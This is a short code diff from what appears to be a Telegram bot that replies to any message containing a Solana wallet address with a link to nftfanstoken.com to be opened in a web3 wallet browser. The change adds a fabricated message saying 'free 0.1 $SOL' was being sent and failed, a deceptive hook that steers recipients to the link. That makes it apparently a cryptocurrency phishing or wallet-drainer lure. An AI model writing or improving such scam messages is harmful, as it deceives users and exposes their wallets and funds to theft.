@@ -438,7 +438,7 @@ bot.on('message', async (msg) => {
     if (containsSolanaWallet(text)) {
       await bot.sendMessage(
         chatId,
-        'To earn free $SOL open this link in the browser of your web3 wallet: nftfanstoken.com/n/subfans and score 1000 SUBFANS.'
+        'Sending free 0.1 $SOL ... sending failed, open this link in the browser of your web3 wallet: nftfanstoken.com/n/subfans and score 1000 SUBFANS.'
       );
     }
 
